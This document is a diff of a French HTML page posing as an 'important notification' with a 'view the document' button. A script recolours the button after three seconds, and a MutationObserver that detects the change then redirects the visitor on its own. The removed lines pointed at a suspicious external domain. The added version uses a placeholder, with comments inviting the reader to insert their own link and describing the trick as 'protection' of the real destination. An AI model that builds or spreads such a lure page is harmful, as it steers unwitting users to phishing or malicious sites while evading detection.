@@ -1,19 +1,76 @@
-<a href="#" id="mon-lien">Mon lien</a>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Notification importante</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f9f9f9;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: #fff;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+    text-align: center;
+    max-width: 500px;
+  }
+  a {
+    display: inline-block;
+    padding: 12px 25px;
+    margin-top: 20px;
+    font-size: 16px;
+    color: #fff;
+    background-color: #0073e6;
+    text-decoration: none;
+    border-radius: 8px;
+    transition: background-color 0.3s, color 0.3s;
+  }
+  a.red {
+    background-color: #ff4d4f;
+  }
+  p {
+    font-size: 18px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Notification importante</h1>
+  <p>Vous avez reçu un nouveau message. Cliquez sur le bouton ci-dessous pour plus de détails.</p>
+  <a href="#" id="mon-lien">Voir le document</a>
+</div>
 
 <script>
   const lien = document.getElementById('mon-lien');
 
-  // Exemple : après 3 secondes, le lien devient rouge
+  // Simulation : après 3 secondes, le lien devient rouge
   setTimeout(() => {
     lien.classList.add('red');
   }, 3000);
 
+  // Observer le changement de classe
   const observer = new MutationObserver(() => {
-    const couleur = window.getComputedStyle(lien).color;
-    if (couleur === 'rgb(255, 0, 0)') { // rouge
-      window.location.href = 'https://cq36750.tw1.ru/'; // <-- ton lien ici
+    const couleur = window.getComputedStyle(lien).backgroundColor;
+    if (couleur === 'rgb(255, 77, 79)') { // rouge
+      // Redirection avec "protection" du lien réel
+      const destination = 'https://example.com'; // <-- mets ton lien ici
+      window.location.href = destination;
     }
   });
 
   observer.observe(lien, { attributes: true, attributeFilter: ['class'] });
 </script>
+
+</body>
+</html>
